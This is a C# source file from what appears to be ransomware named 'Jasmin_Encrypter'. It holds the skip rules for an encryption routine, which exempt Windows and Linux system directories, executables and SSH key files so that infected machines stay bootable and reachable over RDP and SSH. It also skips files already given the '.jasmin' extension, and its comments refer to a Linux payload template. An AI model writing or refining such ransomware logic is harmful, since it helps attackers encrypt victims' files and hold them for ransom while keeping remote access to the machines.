using System;
using System.IO;
using System.Collections.Generic;

namespace Jasmin_Encrypter
{
    public static class SkipRules
    {
        // Windows系统关键目录(保RDP+启动)
        static readonly string[] WinDirs = {
            @"\Windows",
            @"\Program Files",
            @"\Program Files (x86)",
            @"\ProgramData",
            @"\$Recycle.Bin",
            @"\System Volume Information",
            @"\Recovery",
            @"\Boot",
            @"\EFI",
        };

        // Windows关键文件扩展名
        static readonly HashSet<string> WinExts = new HashSet<string>(
            StringComparer.OrdinalIgnoreCase) {
            ".sys",".dll",".exe",".msi",".drv",
            ".ini",".lnk",".bat",".cmd",".ps1",
            ".rdp",".msc",".cpl",".scr",".com",
            ".efi",".bin",".cat",".mof",".wim",
            ".inf",".reg",".dat",".log",".evt",
            ".mui",".nls",".manifest",
        };

        // Linux排除路径前缀(保SSH+启动)
        static readonly string[] LinDirs = {
            "/boot","/dev","/proc","/sys","/run",
            "/sbin","/bin","/lib","/lib64","/usr",
            "/etc","/snap","/lost+found","/mnt",
        };

        // Linux排除文件名
        static readonly HashSet<string> LinFiles = new HashSet<string>(
            StringComparer.OrdinalIgnoreCase) {
            ".bashrc",".bash_profile",".profile",
            ".ssh","authorized_keys","known_hosts",
            "id_rsa","id_rsa.pub","id_ed25519",
            "id_ed25519.pub","sshd_config","ssh_config",
            "shadow","passwd","group","fstab",
            "grub.cfg","initrd","vmlinuz",
        };

        public static bool ShouldSkip(string path)
        {
            if (string.IsNullOrEmpty(path)) return true;
            string full = Path.GetFullPath(path);
            string name = Path.GetFileName(full);
            string ext  = Path.GetExtension(full);

            // 已加密的跳过
            if (ext.Equals(".jasmin", StringComparison.OrdinalIgnoreCase))
                return true;

            if (IsWindows())
                return CheckWin(full, ext);
            else
                return CheckLin(full, name);
        }

        static bool IsWindows()
        {
            return Environment.OSVersion.Platform == PlatformID.Win32NT;
        }

        static bool CheckWin(string full, string ext)
        {
            // 系统目录
            string root = Path.GetPathRoot(full) ?? @"C:\";
            foreach (var d in WinDirs)
            {
                // 前缀必须带路径分隔符边界：否则 root+"Windows" 会匹配
                // "C:\WindowsApps\..."、"C:\WindowsSystem32Backup\..." 等
                // 开头巧合相同的目录，误跳用户文件。
                string p = (root + d.TrimStart('\\').TrimEnd('\\')) + "\\";
                if (full.StartsWith(p, StringComparison.OrdinalIgnoreCase))
                    return true;
            }

            // 系统扩展名
            if (WinExts.Contains(ext)) return true;

            // ntuser / 注册表
            string name = Path.GetFileName(full);
            if (name.StartsWith("ntuser", StringComparison.OrdinalIgnoreCase))
                return true;
            if (name.Equals("bootmgr", StringComparison.OrdinalIgnoreCase))
                return true;

            return false;
        }

        static bool CheckLin(string full, string name)
        {
            foreach (var d in LinDirs)
            {
                // /boot 不应匹配 /bootleg、/bin 不应匹配 /binary
                // （linux_payload.tpl 的 skip() 早已按 d+'/' 判断）
                string p = d.TrimEnd('/');
                if (full == p || full.StartsWith(p + "/", StringComparison.Ordinal))
                    return true;
            }

            if (LinFiles.Contains(name)) return true;

            // .ssh 目录下全部跳过
            if (full.Contains("/.ssh/")) return true;

            return false;
        }
    }
}
